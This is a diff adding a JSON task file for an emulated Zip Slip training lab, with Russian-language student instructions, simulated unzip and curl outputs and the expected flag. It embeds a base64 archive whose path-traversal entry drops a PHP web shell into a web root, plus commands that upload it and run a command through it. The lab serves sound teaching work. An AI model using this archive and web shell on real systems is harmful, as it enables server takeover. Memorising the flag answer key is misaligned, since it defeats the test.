@@ -1,0 +1,50 @@
+{
+  "id": "web-zip-slip",
+  "workdir": "/home/student/task",
+  "hostname": "lab",
+  "expect": {
+    "file": "/home/student/task/found.txt",
+    "contains": "nto{z1p_sl1p_wr1t3s_th3_w3br00t}"
+  },
+  "fs": [
+    { "path": "/home/student/task", "type": "dir" },
+    {
+      "path": "/home/student/task/task.md",
+      "text": "# Практика: Zip Slip\n\nЦель — `https://app.example`. Админка принимает тему архивом:\n\n    POST /admin/themes/upload  (поле file, .zip)\n\nСервер распаковывает архив, не проверяя пути записей. В каталоге уже лежит\nсобранный `evil.zip` — посмотри, что внутри, залей его и проверь, куда попал файл.\n\n1. Листинг архива: `unzip -l evil.zip` — обрати внимание на запись с `../../../`.\n2. Загрузи: `curl -s -X POST https://app.example/admin/themes/upload -F 'file=@evil.zip' -b 'session=admin'`.\n3. Webshell должен оказаться в веб-корне. Прочитай флаг:\n   `curl -s 'https://app.example/evil.php?c=cat+flag.txt' | tail -1 > found.txt`.\n4. Набери `check`.\n"
+    },
+    {
+      "path": "/home/student/task/evil.zip",
+      "b64": "UEsDBBQAAAAAAFKRTV1ZcYfiBgAAAAYAAAAPAAAAdGhlbWUvc3R5bGUuY3NzYm9keXt9UEsDBBQAAAAAAFKRTV2ssRBCHAAAABwAAAAeAAAALi4vLi4vLi4vdmFyL3d3dy9odG1sL2V2aWwucGhwPD9waHAgc3lzdGVtKCRfR0VUWyJjIl0pOyA/PlBLAQIUAxQAAAAAAFKRTV1ZcYfiBgAAAAYAAAAPAAAAAAAAAAAAAACAAQAAAAB0aGVtZS9zdHlsZS5jc3NQSwECFAMUAAAAAABSkU1drLEQQhwAAAAcAAAAHgAAAAAAAAAAAAAAgAEzAAAALi4vLi4vLi4vdmFyL3d3dy9odG1sL2V2aWwucGhwUEsFBgAAAAACAAIAiQAAAIsAAAAAAA==",
+      "mode": "644"
+    }
+  ],
+  "tools": {
+    "unzip": {
+      "help": "unzip [-l | -p <файл>] <архив> — распаковка/листинг архива",
+      "cases": [
+        {
+          "match": "evil\\.zip",
+          "example": "-l evil.zip",
+          "output": "Archive:  evil.zip\n  Length      Date    Time    Name\n---------  ---------- -----   ----\n        6  2026-10-13 12:00   theme/style.css\n       32  2026-10-13 12:00   ../../../var/www/html/evil.php\n---------                     -------\n       38                     2 files\n"
+        }
+      ],
+      "fallback": "unzip: в этой лабе эмулируется только листинг evil.zip.\n"
+    },
+    "curl": {
+      "help": "curl [опции] <url> — HTTP-клиент (эмуляция app.example)",
+      "cases": [
+        {
+          "match": "themes/upload",
+          "example": "-s -X POST https://app.example/admin/themes/upload -F 'file=@evil.zip' -b 'session=admin'",
+          "output": "{\"ok\":true,\"installed\":\"theme\",\"files\":2}\n"
+        },
+        {
+          "match": "evil\\.php",
+          "example": "-s 'https://app.example/evil.php?c=cat+flag.txt'",
+          "output": "uid=33(www-data) gid=33(www-data) groups=33(www-data)\nnto{z1p_sl1p_wr1t3s_th3_w3br00t}\n"
+        }
+      ],
+      "fallback": "curl: в этой лабе эмулируются только /admin/themes/upload и /evil.php на app.example.\n"
+    }
+  }
+}
